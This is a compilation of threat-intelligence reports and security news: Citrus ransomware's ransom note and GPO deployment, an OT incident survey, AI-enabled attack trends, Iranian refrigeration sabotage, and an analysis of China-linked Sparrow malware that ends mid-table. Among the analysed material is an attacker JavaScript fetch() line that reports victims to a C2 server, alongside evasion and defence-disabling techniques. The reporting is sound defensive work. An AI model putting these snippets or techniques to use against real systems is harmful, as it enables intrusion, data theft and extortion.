When launched, the ransomware opens a console on the victim’s device, where it outputs the commands it runs. It also attempts to modify the boot configuration data (BCD) by invoking a nonexistent executable, bcedit (likely a typo for bcdedit):

The ransomware’s console output contains the string:

We`re going to do something special today :). Made with RaaS platform Sn00py.

The string likely means the ransomware is distributed under the ransomware-as-a-service model, where attackers don’t write the malware themselves but subscribe to a ready-made offering.

The ransomware configuration contains the Citrus group’s public key in the pubkey parameter:

-----BEGIN PUBLIC KEY----- A7+eV3M+EDIh5kId+vf46QkKpAOKxUxv97PDFj66ox+uE0GV9UQhrSmBAoGAcyNI +z7noIwrFYnHi6wtj8gLEOT0hE/cNDp0VLoUnAzi551kZA7J3Q575jwqrJcDrZSO JLkZX7pxLLSd9iQdxMxDrLYZGRtiht8ToD5OGZri36oPvnW56ijJZ/NMzlFtVr7V iSZJr5Qkz2cxShcSuhDLLXmzleclBd7HQtWTuZUCgYEAqN8WFAZxkV2e1p4v3U98 VOu4XxEfqAc2Gs2Ccs/kkWoX/1fxvuSRcF6/hMdfVwUP0z+/fnhbFMNfysBeWo1W ZfmpBF/HbnRSg2ZDLWIwXEXEsNNSRmlvwyHWSEZgyG1xjgjSZKWuxo92WVmPxb5i S6NLrZkHPHwqaBy8CnD6ft8= -----END PUBLIC KEY-----

The host_blacklist parameter also lists the system names that are exempt from encryption:

[ "DC01", "DC02", "DC03", "DC04" ]

This list includes the domain controllers used to distribute the policy that launches the ransomware. This way, the attackers ensure the policy keeps propagating uninterrupted.

As it runs, the Trojan drops CITRUS_README.txt files containing the ransom note:

-[ All your data were encrypted ] | |-If you try to decrypt them yourself, you will lose your data. To decrypt all systems, you need to contact us for guidance and a data recovery tool in the future. If you ignore our offer and the conversation does not take place, we will take extreme measures against your company and your employees, as a result of which you will lose access to all resources of your network and lose your reputation. | |-To contact us - register your mail here: https://account.proton.me/mail/signup?plan=free and write to us by email: [REDACTED] |-Further negotiations regarding this situation will be conducted there. Also we have Telegram: [REDACTED] | |-Be sure to use a VPN, and do not attempt to write from other email addresses, as there is a high chance that the messages will not be delivered to either party. | |-You have 72 hours to contact us to establish negotiations and interaction, starting from the date of creation of this file. |-If you do not contact us within 3 days, we will consider this a refusal to cooperate. This will entail immediate measures, such as: Dumps of your services, personal data of employees, accounting, contracts and source code. | |-Warning: \\_ Do not delete, modify, or attempt to recover files by any means other than using our key and decryptor. This will damage your data, and we cannot guarantee its recovery. \\_ Do not try to make this public, as you will only harm yourself and your reputation.

As mentioned above, the group uses malicious Group Policy Objects to launch the ransomware across victim systems en masse. The GPOs are created by self-extracting archives, of which we have seen two versions. Each archive contains:

A self-extracting archive with the ransomware Trojan and auxiliary files.

A directory containing the Group Policy Object. The policy drops the ransomware archive on the target system, creates a scheduled task that runs the archive with the parameters /quiet /norestart, enables the WinRM service, and disables the Volume Shadow Copy service and Windows Defender antivirus protection. It also sets a desktop wallpaper displaying the ransom note.

A PowerShell script that copies the ransomware archive to the \\<current_domain_name>\SYSVOL directory on the domain controller and links the malicious GPO to the domain using the Import-GPO and New-GPLink

One version of the PowerShell script contained comments suggesting that it was likely edited with an LLM:

Links to Toy Ghouls

While analyzing Citrus activity, we noticed several similarities to Toy Ghouls. Although their infrastructures don’t directly overlap, the two groups share TTPs: they encrypt their victims’ systems, use a similar set of tools (1C-Shell for remote command execution on 1C:Enterprise servers, mimikatz, PsExec, and ADRecon), and store these tools in the same directories. What’s more, both groups are Russian-speaking and attack Russian companies only. In several incidents, we saw the same infrastructure compromised simultaneously by both Toy Ghouls and Citrus.

Conclusion

What makes Citrus interesting is its unconventional approach to network tunneling and its use of AI to generate auxiliary tools. Even so, the attackers largely rely on well-known tools and techniques, which makes early detection somewhat easier. Kaspersky solutions detect all the activity described in this article.

That said, the Citrus attacks are another reminder that contractor access to an organization’s infrastructure must be tightly controlled and restricted. After all, compromising contractor accounts is exactly how the attackers get into their victims’ networks. We’ll continue to track the group’s activity and report new techniques as we discover them.

Title: OT Incidents Hit a Third of Industrial Organizations, SANS Finds
Context: Read more on ICS threats: ICS Operators Warned of AI-Driven Attacks on Siemens PLCs Poor visibility into systems appears to be a contributing factor to the rise in incidents and...
Full Text:
A third of organizations running OT or industrial control systems (ICS) recorded at least one cyber incident over the past year, according to new data from SANS Institute.

The cybersecurity training and research specialist polled nearly 700 IT and security professionals to compile its 2026 State of ICS/OT Security Survey Insights report.

It revealed the biggest ever single-year leap in incidents, from 22% last year to 34% of responding organizations in 2026.

The impact of incidents was also more severe. The share of respondents who said an incident affected safety increased from 8% to 13% in the period, and the share reporting theft of IP surged from 6% to 31%.

Shared IT/OT credential and identity compromise (31%) and ransomware (31%) were the most frequently cited incident types this year.

Read more on ICS threats: ICS Operators Warned of AI-Driven Attacks on Siemens PLCs

Poor visibility into systems appears to be a contributing factor to the rise in incidents and the severity of their impact.

Just 13% of respondents claimed to have full IT/OT visibility across the cyber kill chain, with budget (43%) cited as the most common barrier to improved detection.

Early detection is key to minimizing the impact of incidents. Nearly three-quarters (72%) of respondents said these led to facility or system downtime.

Only 15% of respondents said they are fully capable of sustaining critical operations in manual mode for more than 48 hours, while two-fifths (40%) don’t know if they could. In the longest case reported, a shutdown lasted a year.

Risk is arguably greatest in the supply chain. If their primary automation vendor disappeared, 58% of respondents said they would shut down or be unable to operate within a year. Yet only a fifth (20%) have a fully functional third-party risk management program.

A Plan to Build OT Resilience

Staff are another potential point of failure: 68% of organizations said that the loss of one or two key individuals would delay or severely risk ICS/OT security and incident response. A third (33%) are deploying AI or automation tools to overcome potential staff shortages, with real-time threat and anomaly detection (42%) the most common investment.

There are plenty of lessons to be learned from the report. Nearly half (46%) of organizations that test their business continuity and disaster recovery plans at least annually and build ICS/OT into them can bring their most critical facility or system back online within the first day, versus 27% of all respondents.

Yet only 16% of respondents have fully integrated cyber resilience into those programs.

The recent cyber-attacks on supermarket OT equipment across Europe highlight the potential for significant operational disruption and financial damage.

With this in mind, SANS Institute recommended a three-point plan to build resilience:

Test resilience plans at least annually, with the operators who would end up actually run manual mode

Integrate ICS/OT cyber resilience into existing BC/DR programs

Map people and vendor-related dependencies

Jason Christopher, SANS Principal Instructor and author of the report, argued that the most resilient organizations are also the ones that known their ICS/OT systems best.

“Industrial security has come a long way over the past decade, and the data this year shows how much is still left to do,” he added.

“What happens after the alarm comes down to rehearsal: who runs the plant by hand, who holds the knowledge that is not written down, and what the fallback is if a vendor is unavailable. Most of the industry has not answered those questions yet.”

Title: AI Is Both Target and Tool for Threat Actors
Context: Summary Artificial intelligence (AI)-enabled attacks are accelerating, with AI as both a target and a force multiplier
Full Text:
Summary

Artificial intelligence (AI)-enabled attacks are accelerating, with AI as both a target and a force multiplier. Of the 103 AI-enabled incidents analyzed for this report, most involve AI accelerating familiar attack types (supply-chain compromise, phishing, extortion) and making them more convincing. The use of AI is evident throughout the attack lifecycle, though full automation remains rare. Note: The period of analysis for this report is between July 31, 2025 and July 31, 2026.

Developer tools are a prime target. Because AI coding assistants and proxy packages often have privileged access to credentials and code, threat actors use them as footholds for mass credential theft and lateral movement across downstream environments.

State-sponsored actors are beginning to experiment with agentic capabilities. Most of the state-sponsored activity in this report falls within Recorded Future’s AI Malware Maturity Model Level 2–3 (AI-assisted malware development), with one notable exception: a campaign against Taiwanese government entities that employed up to eight AI agents with limited human intervention.

Fully autonomous attacks remain rare, likely for both maturity and operational-risk reasons. Human oversight still appears necessary for reliable outcomes, which may limit the full automation of cyberattacks, especially in sensitive operations where an agent's error can have outsized consequences.

This restraint is unlikely to hold. As agentic techniques mature and diffuse across the threat landscape, autonomous and orchestrated campaigns are likely to become more frequent, alongside a growing underground market for illicit access to commercial models and rising "noise" from low-level automated intrusions that complicate the detection of serious threats.

Iranian hackers turned up the heat on French supermarket freezers, says France
Context: Iran has been officially accused by France of being responsible for cyber attacks last month that meddled with supermarket freezers, causing some to catch fire
Full Text:
Iran has been officially accused by France of being responsible for cyber attacks last month that meddled with supermarket freezers, causing some to catch fire.

According to French authorities, a hacking unit from Iran's Islamic Revolutionary Guard Corps (IRGC) sabotaged food refrigeration systems at approximately 700 retail sites, sparking at least 15 fires and causing tens of millions of euros worth of damage.

On the night of 11 October, the hackers seized remote control of refrigeration controllers and changed their defrost settings to high temperatures. As a report published by the French government’s computer emergency response team (CERT-FR) describes, victims of the attack included Casino, Leclerc, Coopérative U, Metro, Carrefour and Intermarché, as well as butchers, a slaughterhouse, and food-processing plants.

According to French media reports, the targeted refrigeration controllers were made by Danish firm Danfoss, and the attackers targeted older versions of its software.

The finger of blame has been pointed by French authorities in the direction of Shahid Kaveh, a hacking unit within the IRGC. Evidence which is said to have led them to that conclusion includes that the same infrastructure was used, during the same period, to scan Schneider Electric equipment at energy and water facilities. and traces of Farsi. Perhaps the most telling clue of all, however, was that the attack was being trumpeted by a propaganda outlet linked to the hacking unit barely a day later.

Shahid Kaveh is said to hide behind a variety of different "hacktivist" guises including CyberAv3ngers, Soldiers of Solomon, and Cyber Isnaad Front.

The official French report names three men: Hamid Reza Lashgarian, head of the IRGC's Electronic and Cyber Center, and Shahid Kaveh commanders Mahdi Lashgarian and Reza Salarvand.

The same hackers are also believed to have targeted small hydroelectric facilities, while a second Iranian unit called Shahid Shoostari (also known as Emennet Pasargad), is held responsible for attacks on Charlie Hebdo and an attempt to hijack display screens during the 2024 Paris Olympics.

In early November there was a second wave of attacks on refrigeration units which hit businesses across Europe, including three French blood service sites. These attacks have not yet been officially attributed to Iran.

Regardless of who is behind the attacks, it is clearly important that any organisation properly defends its refrigeration systems to prevent tampering. As such, it remains good advice to ensure that operational technology (OT) interfaces are not exposed to the internet, that controller software is kept up to date, that default passwords are changed, and that OT networks are segmented and monitored for unexpected changes.

With fridge attacks like this continuing to create disruption and cost millions of euros, we can expect relations between Paris and Tehran to remain frosty for some time.

Title: Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe
Context: The clusters, SilentDelivery, OceanGate and DarkWire, are linked through shared infrastructure features and malware code similarities within the Sparrow malware framework
Full Text:
Key Points

During a year-long investigation, Check Point Research identified three distinct operational clusters spanning Latin America, Asia, and Europe targeting telecommunications providers, government organizations, military entities, research institutions, and critical infrastructure.

The clusters, SilentDelivery, OceanGate and DarkWire, are linked through shared infrastructure features and malware code similarities within the Sparrow malware framework.

We track the entity behind the Sparrow framework as CopperDragon, a potential digital quartermaster supporting China-nexus threat actors, including FamousSparrow, Earth Estries, TropicTrooper, UAT-9244, and others.

Each cluster employed a different toolset and different initial access techniques, including compromising internet-facing infrastructure and highly selective watering-hole attacks. The compromised websites that were used for watering hole attacks were of government, shipping, and IT and research sectors.

Our research uncovered several previously undocumented tools and new details about the Sparrow framework, including Windows and Linux variants, passive backdoor capabilities, and a connection to the Melofee backdoor.

Introduction

Over the past year, Check Point Research investigated a series of intrusion campaigns targeting several dozens of high-profile organizations across Latin America, Asia, and Europe. These campaigns initially appeared to be independent operations, each using different backdoors, post-exploitation tools and operational pace.

However, we identified numerous connections between the tools and their infrastructure which linked them to the same Sparrow malware ecosystem. We track the entity behind these campaigns as CopperDragon, which may serve as a digital quartermaster supporting a number of China-nexus threat actors that use the Sparrow cross-platform malware framework for Linux and Windows.

What is CopperDragon?

FamousSparrow is a threat actor that was first identified in 2021, whose main backdoor is SparrowDoor. Since then, multiple vendors have reported on related activity and malware variants, including CrowDoor, HemiGate, and TernDoor.

Over time, it became apparent that this other activity was not necessarily carried out by the original FamousSparrow group. Instead, reporting pointed to several distinct actors using a shared toolset, potentially supplied by the same entity. These actors include FamousSparrow, Earth Estries, TropicTrooper, UAT-9244, and others. FamousSparrow was previously also linked to Salt Typhoon, but the relationship details remain unclear. Based on the apparent tool-sharing, we began tracking the entity behind the Sparrow framework as CopperDragon, its possible developer and supplier.

In this report, we examine three distinct activity clusters targeting major telecommunications providers, government organizations, and military entities. Together, these operations provide a broader view of the connected and evolving espionage ecosystem linked to CopperDragon:

SilentDelivery uses highly selective watering-hole attacks that distribute the SquadC backdoor through Trojanized MSI installers masquerading as certificate repair utilities. This cluster focuses on Europe and Asia regions.

OceanGate focuses primarily on Asian organizations and uses a variant of SparrowDoor. The actor first compromised internet-facing Linux systems before moving laterally into Windows environments, using a broad set of post-exploitation tools for both operating systems.

DarkWire targets telecommunications providers and government organizations across Latin America, using CopperDoor and CopperDNS as its main backdoors.

Figure 1 – Geographic distribution of Sparrow framework victims.

SilentDelivery: Selective Watering-Hole Attacks

Beginning in early 2026, we started tracking new activity related to CopperDragon that introduces a unique initial access methodology, using watering-hole attacks that target high-profile organizations mainly in Europe and Asia. We track this activity as the SilentDelivery operation. While we were finalizing this report, part of this cluster was also reported by Positive Technologies.

Figure 2 – SilentDelivery infection chain.

The attackers first compromised legitimate websites frequently visited by their intended targets. When a victim visited one of these websites, a heavily obfuscated JavaScript payload injected into the page completely replaced the legitimate content with a Google Chrome SSL certificate warning customized to the website’s language. The fake warning blocked access to the website and instructed the user to install a “Certificate Fix” utility. This utility deployed either a previously undocumented backdoor called SquadC or, in some cases, a variant of SparrowDoor.

Figure 3 – A fake Chrome certificate error page with an added “Install certificate” button.

Compromised websites

All the compromised websites we confirmed were related to the government, shipping, and IT and research sectors. In one case, the website was exploited using an XSS attack on an unsensitized input field. Based on Check Point telemetry, the operations primarily targeted organizations in countries such as the Czech Republic, Germany, France, Taiwan, Nepal, Hong Kong and Indonesia.

Figure 4 – A newer version of Chrome’s certificate error appearing in different languages.

Across the analyzed websites, we also identified three S3 buckets that we believe were compromised by the threat actor. These buckets hosted the next-stage backdoor, which was downloaded when the user clicked the “Install certificate” button.

JavaScript Analysis

The JavaScript injected into the compromised websites is heavily obfuscated using jsjiami, a publicly available JavaScript obfuscation service. It first checks whether the user is running Windows and, in some cases, verifies that the website’s domain matches the intended compromised domain.

Figure 5 – Deobfuscated JavaScript checking if the browser is a Windows host.

The script then starts a loop that repeatedly sends status-check requests to the C2 (command and control) server at /image-check?t=<datetime>. These requests are used to fingerprint the user based on IP and geolocation and determine whether to continue the attack and hijack the webpage. They also enable the threat actor to control the attack and stop displaying the fake certificate error after a successful compromise, thus reducing the likelihood of raising the user’s suspicions. If the server returns HTTP 200, the webpage is left unchanged and the user can access the website normally. If the server does not respond, the script hijacks the webpage and displays the fake certificate error.

When the user clicks “Install certificate”, the script sends a POST request to the C2 server at /report-url. This request reports the click and includes the compromised website’s URL in its JSON body. At the same time, the script initiates the download of an MSI package containing the next-stage backdoor from an attacker-controlled S3 bucket.

fetch(serverUrl + "/report-url", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: window.location.href }) });

After the user executes the backdoor, it sends a request to the C2 server at /register-ip, indicating a successful compromise. The fake certificate error will not appear the next time the user visits the compromised website.

SquadC backdoor

SquadC is a Windows backdoor written in C/C++ that provides operators with basic remote control over a compromised host. The backdoor is loaded in memory using a separate loader component that decrypts and loads it through a three-stage process. The name SquadC is derived from an internal reference left by the author in the sample:

Figure 6 – Internal reference identifying the backdoor as SquadC.

Depending on its configuration, the backdoor supports several flags, including one that enables checks to avoid execution in sandbox environments. These checks look for VM artifacts in the file system and Windows registry, as well as blacklisted MAC addresses and specific screen resolutions and disk sizes.

As an additional measure to evade sandboxes and automated analysis, the backdoor can be configured to run only if a browser is currently running on the host. As the backdoor is downloaded through a browser during the infection, it’s expected that a browser remains open. The check is done by enumerating running process names and comparing them against a fixed list of browsers:

browser_list = [chrome.exe, msedge.exe, edge.exe, firefox.exe, brave.exe]

To survive host reboots, the backdoor achieves persistence by manipulating the registry Run key under a key WindowsUpdateAssist.

The backdoor supports a small set of commands for command execution and file system management and serves mainly as an initial foothold in the compromised host.

SquadC in phishing attacks

While hunting for related files, we identified an additional way to distribute SquadC through spear phishing. We found a compressed archive named Strategi_AS_Referensi_April2026.rar, uploaded to VirusTotal from Indonesia which aligns with Indonesian organizations observed in watering-hole activity. The backdoor was configured to communicate with the same IP address used in the watering-hole infection chain, suggesting that both activities were linked to the same threat actor.

The archive contains four files:

Strategi_AS_Referensi_April2026.docx.lnk – An LNK file abusing the ftp.exe LOLBin for command execution.

_rels/info.dll – A batch script executed using ftp.exe:

Figure 7 – info.dll file content.

_rels/.rels.log – A cab file containing the SquadC loader components:

Figure 8 – SquadC loader components in the .rels.log CAB file.

_rels/557.pdf – An empty file.

When the LNK file is executed, it runs a series of CMD commands to extract and execute the SquadC backdoor. It also opens a decoy document, which in this case is an empty file.

SilentDelivery Infrastructure

The SilentDelivery operation was attributed to CopperDragon based on two primary observations:

In some cases, the final payload was a variant of SparrowDoor. Even in cases involving SquadC, the DLL used to load the backdoor was previously used in the FamousSparrow toolset.

The C2 infrastructure of SquadC shares several characteristics with infrastructure associated with FamousSparrow, including server layout, exposed services and ports, HTTP response banners, and reused TLS certificates.

Subject: C=US ST=US L=Oregon O=VeriSign Class 3 Code Signing 2010 CA OU=VeriSign Class 3 Code Signing 2010 CA CN=VeriSign Trust Network Issuer: C=US ST=US L=Santa Clara O=McAfee, Inc. OU=McAfee, Inc. CN=McAfee, Inc. Serial Number: 0x4872589ca964eac0776b1e9617e9813cb1da49dc Not Before: 2023-04-28 11:13:39 Not After: 2024-04-27 11:13:39 Fingerprint SHA-1: 760be920fad07881b8ce9d94e074a35b4f806717

TLS certificate reused across SilentDelivery and OceanGate C2 infrastructure.

OceanGate: From Linux Initial Access to Domain Administrator

The OceanGate operation was observed during 2025-2026 primarily targeting government organizations and critical infrastructure in Asia. Some activity was also seen in other regions. The operation followed a more common intrusion pattern, with tooling and operational TTPs (Tactics, Techniques, and Procedures) consistent with those previously reported by multiple vendors and tracked as FamousSparrow.

In this attack, the threat actor operated across both Linux and Windows environments, deploying several previously unreported tools to maintain access and move across the compromised network. The operation involved extensive credential theft, lateral movement, data staging, and exfiltration of sensitive operational information. The Linux activity was particularly interesting, given the limited reporting on how the actor operates in these environments and the tools it uses.

Linux operation

The intrusion began with the exploitation of a vulnerable internet-facing Linux server, followed by the deployment of two new backdoors: AnnobinDoor and SparrowShell.

Figure 9 – OceanGate cluster: Linux attack chain diagram.

AnnobinDoor

The first backdoor deployed after initial access was AnnobinDoor, a statically linked, Go-based backdoor packed with UPX and internally named annobinagent. By default, it uses WebSocket but also supports HTTP and raw TCP. Its requests include browser-like headers and standard WebSocket upgrade fields, which helps the traffic resemble legitimate application communications.

The backdoor provides a broad range of remote access and pivoting capabilities, including an interactive shell, file management, SOCKS proxying, SSH tunneling, port forwarding, and reverse connections.

Together, these features allow the infected Linux host to function as both a remote shell and an internal network pivot.

SparrowShell

Later in the attack, the actor also deployed another backdoor we named SparrowShell. SparrowShell is a modular Linux backdoor that shares significant design and code similarities with the Windows backdoor SparrowDoor. The two belong to the same cross-platform malware family, with versions developed for Linux and Windows. They share the same C2 infrastructure and RC4 decryption keys, as well as similar command-line arguments and comparable plugin-based architectures.

These commands are supported by SparrowShell:

Command ID

Direction

Description

0x1001

Client → C2

Sends host fingerprint (OS, IPs, user, hostname, timestamp, host ID). Waits for magic value 0x11223344 to confirm the connection and mark the C2 as active.

0x1002

Client ︎ C2

Requests a plugin module from the C2. Receives encrypted blob, decrypts it, saves to /tmp/%x, loads via dlopen, executes xmain, then deletes it from disk.

0x1003

Client → C2

Sends additional host identifier/hash. Connection is validated based on the C2 response (0x11223344) or dropped if invalid.

0x1004

C2 → Client

Returns current runtime configuration (228-byte structure) to the C2.

0x1005

C2 → Client

Receives new configuration (228 bytes), encrypts it, and stores it as <executable>_ for persistence across runs.

0x1006

Removes persistence (cron/systemd), deletes binary and config, clears temp files, removes iptables rules, and terminates execution.

0x1007

Opens a local TCP listener on a specified port and bridges incoming connections to the C2 (port forwarding).

0x100A

Establishes outbound connection to target/port and bridges it to the C2, enabling reverse tunneling.
